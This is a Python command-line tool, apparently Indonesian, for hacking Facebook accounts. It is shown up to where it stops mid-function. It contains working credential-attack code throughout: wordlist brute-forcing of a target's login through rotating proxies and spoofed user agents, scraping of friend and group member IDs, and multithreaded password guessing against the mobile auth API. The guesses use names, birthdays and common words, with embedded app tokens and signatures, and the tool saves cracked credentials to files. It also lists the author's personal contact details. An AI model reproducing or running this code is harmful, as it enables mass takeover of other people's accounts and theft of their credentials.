'''    ___  ____ ___  ____ ____    ____ ____ ____ ____ ___  ____
       |__] |___ |__] |__| [__     |__/ |___ |    |  | |  \ |___
       |__] |___ |__] |  | ___]    |  \ |___ |___ |__| |__/ |___ '''
#!/bin/usr/python
from multiprocessing.pool import ThreadPool
from getpass import getpass
import uuid, os, urllib.request, sys, json, time, hashlib, random, shutil, re, threading
import importlib
try:
    import mechanize, requests
    from requests import Session, get, post
    from mechanize import Browser
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install mechanize')
    os.system('pip install requests')
    os.system('pip install beautifulsoup4')
if sys.version[0] == '2':
    print(green('[INFO]'),(k),'Ini Menggunakan Python3!')
    sys.exit(1)
importlib.reload(sys)
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U;id) Presto/2.12.423 Version/12.16')]
sleep = time.sleep
h = '\x1b[32m'
r = '\x1b[1;91m'
k = '\x1b[1;97m'
n = '\033[94m'
W = "\033[0m"
G = '\033[32;1m'
R = '\033[31;1m'
time.sleep(1)
back = 0
lol = []
idd = []
threads = []
berhasil = []
cekpoint = []
gagal = []
idb = []
listgrup = []
id = []
ibb = []
s = ('   Thanks to : Indo'+R+'X'+k+'ploit'+r+' and '+k+'Python Indonesia')
t = ('                       Token')
m = ('              Multibruteforce Facebook')



user_agent_list = [
   #Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
]

proxies_list = [
    'http://10.10.1.10:3128',
    'http://77.232.139.200:8080',
    'http://78.111.125.146:8080',
    'http://77.239.133.146:3128',
    'http://74.116.59.8:53281',
    'http://67.53.121.67:8080',
    'http://67.78.143.182:8080',
    'http://62.64.111.42:53281',
    'http://62.210.251.74:3128',
    'http://62.210.105.103:3128',
    'http://5.189.133.231:80',
    'http://46.101.78.9:8080',
    'http://45.55.86.49:8080',
    'http://40.87.66.157:80',
    'http://45.55.27.246:8080',
    'http://45.55.27.246:80',
    'http://41.164.32.58:8080',
    'http://45.125.119.62:8080',
    'http://37.187.116.199:80',
    'http://43.250.80.226:80',
    'http://43.241.130.242:8080',
    'http://38.64.129.242:8080',
    'http://41.203.183.50:8080',
    'http://36.85.90.8:8080',
    'http://36.75.128.3:80',
    'http://36.81.255.73:8080',
    'http://36.72.127.182:8080',
    'http://36.67.230.209:8080',
    'http://35.198.198.12:8080',
    'http://35.196.159.241:8080',
    'http://35.196.159.241:80',
    'http://27.122.224.183:80',
    'http://223.206.114.195:8080',
    'http://221.120.214.174:8080',
    'http://223.205.121.223:8080',
    'http://222.124.30.138:80',
    'http://222.165.205.204:8080',
    'http://217.61.15.26:80',
    'http://217.29.28.183:8080',
    'http://217.121.243.43:8080',
    'http://213.47.184.186:8080',
    'http://207.148.17.223:8080',
    'http://210.213.226.3:8080',
    'http://202.70.80.233:8080',
]

sleep(0.2)
os.system('clear')
def tik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
print(k)
def logo1():
    os.system('clear')
    print(R,'   ╔═╗                  ╔═╗╔╗')
    print(R,'   ║╔╝                  ║╔╝║║')
    print(R,'  ╔╝╚╗╔══╗╔═╗╔══╗╔══╗  ╔╝╚╗║╚═╗',G,'Author  : 𝙰𝚂𝙼𝙸𝙽')
    print(R,'  ╚╗╔╝║╔╗║║╔╝║╔═╝║║═╣  ╚╗╔╝║╔╗║',G,'Github  : asmin19',k)
    print('    ║║ ║╚╝║║║ ║╚═╗║║═╣   ║║ ║╚╝║',G,'Version : 4.0',k)
    print('    ╚╝ ╚══╝╚╝ ╚══╝╚══╝   ╚╝ ╚══╝  ')
    print(r+'###################################################'+k)
def logo():
    try:
        bot=open('cookie/login.txt','r').read()
        links = requests.get("https://graph.facebook.com/me/?access_token="+bot)
        z = json.loads(links.text)
        say = z['name']
    except KeyError:
        os.system('rm -rf cookie')
        logo1()
        print(a)
        toke()
    except FileNotFoundError:
        logo1()
        print(a)
        toke()
    os.system('clear')
    print(R,'   ╔═╗                  ╔═╗╔╗')
    print(R,'   ║╔╝                  ║╔╝║║')
    print(R,'  ╔╝╚╗╔══╗╔═╗╔══╗╔══╗  ╔╝╚╗║╚═╗',G,'Author  : 𝙰𝚂𝙼𝙸𝙽')
    print(R,'  ╚╗╔╝║╔╗║║╔╝║╔═╝║║═╣  ╚╗╔╝║╔╗║',G,'Github  : asmin19',k)
    print('    ║║ ║╚╝║║║ ║╚═╗║║═╣   ║║ ║╚╝║',G,'Version : 4.0',k)
    print('    ╚╝ ╚══╝╚╝ ╚══╝╚══╝   ╚╝ ╚══╝  '+n+say)
    print(r+'###################################################'+k)
a = ('===================================================')
def about():
    logo()
    print('')
    tik(s)
    print('')
    print(R+'########################[INFORMATION]###################'+k)
    print('')
    print('   Creator                Asmin')
    print('   About this tools       All about hacking facebook accounts')
    print('   Version                3.0')
    print('   Special thanks to     '+G+' Khoirul Amsori'+k+' and'+G+' Ez Nhana Hna'+k)
    print('   Code name              As'+r+'_'+k+'Min')
    print('   Team                   Buton '+R+'Sec'+k+'.')
    print('   E-mail                 asmin987asmin@gmail.com')
    print('   Github                 asmin19')
    print('   Telegram               @asmin19')
    print('   WhatsApp               +62 852-6834-5036')
    print('   Date                   20:15 13-07-2019')
    print('   Region                 Baubau,Sulawesi Tenggara, Indonesia')
    print('   Support Password       xxx123, xxx12345, xxx12, xxx, birthday, \n                          sayang, minions, number, and many more')
    print('   New Features           You can crack with'+R+' Super-Multibruteforce\n'+k+'                          from friendlist your friends')
    print(n+"* I'm not hacker, but i'm a beginner programmer ")
    print('')
    tik(R+ '* If you find any error or problems, please contact author')
    print(k)
    input('[+] Press [Enter] to return ')
    print('')
    login()
def menu():
    print('''  [ 01 ] Create Wordlist
  [ 02 ] Bruteforce
  [ 03 ] Multibruteforce Facebook
  [ 04 ] Friends Information
  [ 05 ] Bot Facebook
  [ 06 ] Yahoo Clone
  [ 07 ] Token
  [ 08 ] About
  [ 09 ] Update
  [ 00 ] Exit
  ''')
    try:
        asm = input(n+'[#] Asmin'+k+'/' + r+'~' + k + '> ')
        if asm in ['']:
            tik(R+'[!] Please enter your choice ')
            input('[+] Press [Enter] to return ')
            login()
        elif asm in ['1','01']:
            word()
        elif asm in ['2','02']:
            brute()
        elif asm in ['3','03']:
            mbf()
        elif asm in ['4','04']:
            info()
        elif asm in ['5','05']:
            mbot()
        elif asm in ['6','06']:
            clone()
        elif asm in ['7','07']:
            token()
        elif asm in ['8','08']:
            about()
        elif asm in ['9','09']:
            up()
        elif asm in ['0','00']:
            keluar()
        else:
            tik(R+'[!] Wrong input')
            input(n+'[+] Press [Enter] to return ')
            os.system('clear')
            logo()
            print(s)
            print(a)
            menu()
    except EOFError:
        keluar()
    except KeyboardInterrupt:
        keluar()
def up():
    os.system('git pull origin master')
def word():
    try:
        os.mkdir('wordlist')
    except:
        pass
    os.system('clear')
    logo()
    print('               Create wordlist')
    print(a)
    try:
        tik('[+] Welcome to the simple wordlist making program')
        print(G+'[warn] Save the file with extension (txt)',k)
        pas = input('[?] Enter file name: ')
        wordlist = []
        tik('[+] press [Enter] 2x, to finish\n[+] Press [Ctrl + d] to abort')
        while True:
            lis = input('[?] Input Wordlist: ')
            if len(lis) >= 1:
                wordlist.append(lis)
            else:
                with open('wordlist/'+pas, 'w') as berkas:
                    for i in wordlist:
                        berkas.write(i + '\n')
                    break
        tik('[+] Saved : '+h+'wordlist/'+pas)
        input(n+'[+] Press [Enter] to return '+k)
        login()
    except FileNotFoundError:
        tik('[!] Anda Tidak Menulis Nama file')
        word()
    except EOFError:
        os.system('clear')
        logo()
        print(s)
        print(a)
        menu()
def brute():
    try:
        logo()
        print('                   Bruteforce Fb')
        print(a)
        URL = 'https://m.facebook.com/login'
        email = input('[?] Enter the Email or ID target : ')
        sandi = input('[?] Enter the file wordlist : ')
        passw = open(sandi, 'r')
        fuck = passw.readlines()
        print ('[+] Total : '+str(len(fuck)))
        print ('[+] Try to crack.....')
        print(a)
        san = open(sandi,'r')
        for password in san:
            form_data = {'email' : email,
                        'pass' : password
                        }
            user_agent = random.choice(user_agent_list)
            headers = {'User-Agent': user_agent}
            proxies_a = random.choice(proxies_list)
            proxies = {'http': proxies_a}
            with requests.Session() as c:
                c.get(URL, headers=headers, proxies=proxies)
                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            x = soup.find('title')
            if(str(x) == '<title>Masuk Facebook | Facebook</title>'):
                print('['+h+'TRY'+k+']'+n, password,end="", flush=True)
                print ('\r', end="", flush=True)
            else:
                print (k+'['+h+'TRY'+k+']'+n, password, end="", flush=True)
                print (R+'['+h+'LOGIN SUCCESS'+R+']')
                print (k+'['+h+'PASSWORD'+k+'] '+n+ password)
                exit()
        print(k+a)
        tik(R+'[!] Password not found ')
        tik(k+'[!] The wordlist is up, please try again using another wordlist')
        input('[!] Press [Enter] to return ')
        login()
    except FileNotFoundError:
        tik('[×] File not found')
        input('[+] Press [Enter] to return ')
        logo()
        crack()
    except requests.exceptions.ConnectionError:
        tik(R+'[!] Check Your Connection')
        exit()
    except KeyboardInterrupt:
        login()
def mbf():
    try:
        os.system('clear')
        logo()
        print(m)
        print(a)
        print('''  [ 01 ] Dump ID
  [ 02 ] Dump ID Friends
  [ 03 ] List Groups
  [ 04 ] Crack Friends
  [ 05 ] Crack Group
  [ 00 ] Back
  ''')
        Min = input(n+'[#] Asmin' + k + '/' + n + 'Mbf'+ k + '/' + R + '~' + k + '> ')
        if Min in['']:
            tik(R+'[!] Please! enter your choice!')
            input('[!] Press [Enter] to return ')
            mbf()
        elif Min in  ['1','01']:
            idf()
        elif Min in ['2','02']:
            idff()
        elif Min in ['3','03']:
            gruplist()
        elif Min in ['4','04']:
            simple()
        elif Min in ['5','05']:
            crack_grup()
        elif Min in ['0','00']:
            os.system('clear')
            sleep(0.001)
            logo()
            print(s)
            print(a)
            menu()
        else:
            print(R+'[!] Wrong input')
            input('[!] Press [Enter] to return ')
            mbf()
    except EOFError:
        keluar()
    except KeyboardInterrupt:
        keluar()
def simple():
    os.system('clear')
    logo()
    print(m)
    print(a)
    print('''  [ 01 ] Simple
  [ 02 ] Super
  [ 03 ] Back
''')
    cip = input(n+'[#] Asmin' + k + '/' + n + 'Mbf' + k + '/' + n + 'Friends' + k + '/' + R + '~'+ k + '> ' )
    if cip in ['']:
        print(R + '[!] Please! Enter your choice')
        input('[!] Press [Enter] to return '+k)
        simple()
    elif cip in ['1','01']:
        teman()
        hasil()
    elif cip in ['2','02']:
        lama()
    elif cip in ['3','03']:
        mbf()
    else:
        print(R+'[!] Wrong input')
        input('[!] Press [Enter] to return'+k)
        simple()
def lama():
    os.system('clear')
    logo()
    print(m)
    print(a)
    print('''  [ 01 ] Using ID friends
  [ 02 ] Crack my friends
  [ 03 ] back
  ''')
    cip = input(n+'[#] Asmin' + k + '/' + n + 'Mbf' + k + '/' + n + 'Friends' + k + '/' + n + 'Super' + k + '/' + R + '~' + k + '> ' )
    if cip in ['']:
        print(R+'[!] Please! Enter your choice')
        input('[!] Press [Enter] to return '+k)
        lama()
    elif cip in ['1','01']:
        ff()
    elif cip in ['2','02']:
        tema()
    elif cip in ['0','00']:
        simple()
    else:
        print(R+'[!] Wrong input')
        input('[!] Press [Enter] to return'+k)
        lama()
def idf():
        try:
            os.mkdir('dump')
        except:
            pass
        tik ('[*] Load access token...')
        sleep(2)
        try:
            token = open("cookie/login.txt",'r').read()
            print ('[*] Token Found')
        except IOError:
            print ('[!] Token not found')
            os.remove('cookie/login.txt')
            toke()
        try:
            r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
            a = json.loads(r.text)
            fule  = input("[+] Save file : ")
            tik('[+] Starting process....')
            out = open('dump/'+fule,'w')
            for i in a['data']:
                idd.append(i['id'])
                out.write(i['id'] + '\n')
                print ('Nama : ' + i['name'])
                print ('ID   : ' + i['id'])
            out.close()
            tik('\r[*] Succesfully Getting ID all friends')
            tik("[*] File Saved  : dump/" + fule)
            print('[+] Number of IDs ' + str(len(idd)))
            input('[+] Press [Enter] to return ')
            mbf()
        except KeyboardInterrupt:
            tik('\r[!] Stopped')
            exit()
        except KeyError:
            tik('[!] Failed to getting ID friends')
            input('[+] Press [Enter] to return ')
            mbf()
        except requests.exceptions.ConnectionError:
            tik(R+'[!] Check Your Connection')
            exit()
def hasil():
    print('')
    for b in berhasil:
        print(b)
    for c in cekpoint:
        print(c)
    print
    print (R+'[×] Failed >> '+k+ str(len(gagal)))
    print('')
    a = input('[+] Try again? [y/n] : ')
    try:
        if a.lower() == 'n' or a.upper() == 'N':
            os.system('clear')
            mbf()
        elif a.lower() == 'y' or a.upper() == 'Y':
            os.system('clear')
            logo()
            teman()
            hasil
        else:
            print(R+'[!] Wrong input')
            print('[!] Exiting programs'+k)
            sleep(2)
            exit()
    except ValueError:
        print(R+'[!] Exiting programs')
        exit()
def crack_grup():
    try:
        tik ('[*] Load access token...')
        sleep(2)
        toket = open("cookie/login.txt",'r').read()
        print ('[*] Token found')
    except IOError:
        tik('[!] Token not found')
        os.remove('cookie/login.txt')
        toke()
    try:
        idg = input('[?] ID Grup : ')
        r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
        aw = json.loads(r.text)
        print ('[+] Name group : ' + aw['name'])
    except KeyError:
        print('[!] Group not found')
        input('[+] Press [Enter] to return')
        mbf()
    except requests.exceptions.ConnectionError:
       tik(R+'[!] Check your connection')
       exit()
    re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    s = json.loads(re.text)
    for i in s['data']:
        id.append(i['id'])
    print('[+] Jumlah ID : ' + str(len(id)))
    tik('[!] Starting Crack...')
    def main(arg):
        user = arg
        try:
            c = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(c.text)
            pass1 = b['first_name'] + '123'
            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass2)
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass3)
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass4)
                                        else:

                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print('['+h+'OK'+k+'] > ' + user + ' | sayang')
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print('['+R+'CP'+k+'] > ' + user + ' | sayang')
                                                else:

                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=doraemon&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print('['+h+'OK'+k+'] > ' + user +' | doraemon')
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print('['+R+'CP'+k+'] > ' + user + ' | doraemon')
                                                        else:
                                                            y = json.loads(a.text)
                                                            pass5 = y['first_name'] + '12'
                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass5)
                                                            else:
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print('['+R+'CP'+k+'] > '+user+' | ' + pass5)
                                                                else:
                                                                    pass6 = y['last_name'] + '12'
                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass6)
                                                                    else:
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass6)
                                                                        else:
                                                                            pass7 = 'anjing'
                                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass7)
                                                                            else:
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass7)
                                                                                else:
                                                                                    pass8 = 'freefire'
                                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass8)
                                                                                    else:
                                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass8)
                                                                                        else:
                                                                                            pass9 = 'bangsat'
                                                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                            q = json.load(data)
                                                                                            if 'access_token' in q:
                                                                                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass9)
                                                                                            else:
                                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                                    print('['+R+'CP'+k+'] > ' + user + ' | ' + paas9)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print('[+] Succses')
    input('[+] Press  [Enter] to return')
    mbf()
def idff():
    try:
        os.mkdir('dump')
    except:
        pass
    try:
        tik('[!] Loads access token....')
        sleep(2)
        toket = open('cookie/login.txt', 'r').read()
        print('[+] Token found')
    except IOError:
        tik('[!] Token not found')
        os.system('rm -rf cookie/login.txt')
        input(R+'[!] Press [Enter] to new generate access token ')
        logo()
        print(t)
        print(a)
        toke()
    else:
        try:
            print(a)
            idt = input('[+] Enter friend ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print('[+] ID Dari: ' + op['name'])
            except KeyError:
                print('[!] You have not been friends with ' + op['name'])
                input('[+] Press [Enter] to return')
                mbf()
            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = input("[?] Save file : ")
            bz = open('dump/'+save_idt, 'w')
            print('[+] Starting process....')
            for ah in z['friends']['data']:
                idb.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print ('Name : ' + ah['name'])
                print ('ID   : ' + ah['id'])
            print('[+] Number of IDs :  ' + str(len(idb)))
            print('[+] File saved    : output/' + save_idt)
            bz.close()
            input('[+] Press [Enter] to return')
            mbf()
        except KeyError:
            print('[×] Anda Belum Berteman Dengan ' + op['name'])
            input('[+] Press [Enter] to return ')
            os.remove('save_idt')
            mbf()
        except (KeyboardInterrupt, EOFError):
            print('[!] stopped')
            input('[!] Press [Enter] to return ')
            mbf()
        except requests.exceptions.ConnectionError:
            tik(r+'[!] Check Your Connection')
            exit()
        except IOError:
            print('[!] Kesalahan saat membuat file')
            input('[!] Press [Enter] to return ')
            mbf()
def teman():
    global file
    global idlist
    global passw
    try:
        os.mkdir('output')
    except:
        pass
    try:
        tik('[+] Load access token....')
        fail = open('cookie/login.txt', 'r').read()
        print('[+] Token found')
    except IOError:
        tik(r+'[!] Token not found'+k)
        os.system('rm -rf cookie/login.txt')
        input('[!] Press [Enter] to generate access token ')
        logo()
        print(t)
        print(a)
        toke()
    else:
        print('')
        idlist = input('[?] File ID   : ')
        passw = input('[?] Password  : ')
        try:
            file = open(idlist, 'r')
            tik('[!] Starting hacking......')
            for x in range(40):
                As = threading.Thread(target=scrak, args=())
                As.start()
                threads.append(As)
            for As in threads:
                As.join()
        except IOError:
            print('[!] File not found')
            input('[+] Press [Enter] to return ')
            os.system('clear')
            logo()
            print(s)
            print(a)
            mbf()
def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=901418953537472%3eloTcOpO1Zkda0groyoEkTeuTI&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.request.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('output/live.txt', 'a')
                bisa.write('ID dari : ' + idlist + '\n')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('output/Cekpoint.txt', 'a')
                    cek.write('ID dari : ' + idlist + '\n')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
                    sys.stdout.write('\r[+] Searching Password : ' + passw + '\x1b[1;91m\x1b[1;97m ' + str(back) + '\x1b[1;96m>\x1b[1;97m' + str(len(up)) + '[Ok > ' + str(len(berhasil))+']' + '[Cp > ' + str(len(cekpoint))+']')
                    sys.stdout.flush()
    except IOError:
        print ('\n[!] Koneksi terganggu')
        sleep(0.0001)
    except ConnectionError:
        tik(R+'[!] Connection Error'+k)
def token():
        os.system('clear')
        logo()
        print(t)
        print(a)
        print('''  [ 01 ] Generate Access Token
  [ 02 ] Remove Token
  [ 03 ] Show Token
  [ 00 ] Back
  ''')
        pilihan = input(n+'[#] Asmin' + k + '/' + n + 'Token' + k + '/' + n+'~'  + k + '> ')
        if pilihan in ['']:
            print(R'[!] Please Enter your choice')
            input('[+] Press [Enter] to return'+k)
            token()
        elif pilihan in ['1','01']:
            toke()
        elif pilihan in ['2','02']:
            hapus()
        elif pilihan in ['3','03']:
            try:
                op = open('cookie/login.txt','r').read()
                print('[>] Your Access Token : \n'+h+op)
                print('')
                input(k+'[!] Press [Enter] to return')
                token()
            except FileNotFoundError:
                print("[!] You don't have token access yet")
                input('[!] Press [Enter] to return')
                token()
        elif pilihan in ['0','00']:
            os.system('clear')
            sleep(0.7)
            logo()
            print(s)
            print(a)
            menu()
        else:
            tik(R+'[!] Wrong input')
            input('[+] Press [Enter] to return'+k)
            os.system('clear')
            logo()
            print(t)
            print(a)
            token()
def toke():
    try:
        open('cookie/login.txt').read()
        print(R+'[!] An access token already exists')
        r = input(k+'[?] Are you sure want to continue [Y/N] : ')
        if r.lower() == 'y' or r.upper() == 'Y':
            toket()
        else:
            login()
    except FileNotFoundError:
        toket()
def toket():
    try:
        os.mkdir('cookie')
    except:
        pass
    try:
        print(k+'['+R+'NOTE'+k+']'+h+' Before using this tools, please login in Opera Mini')
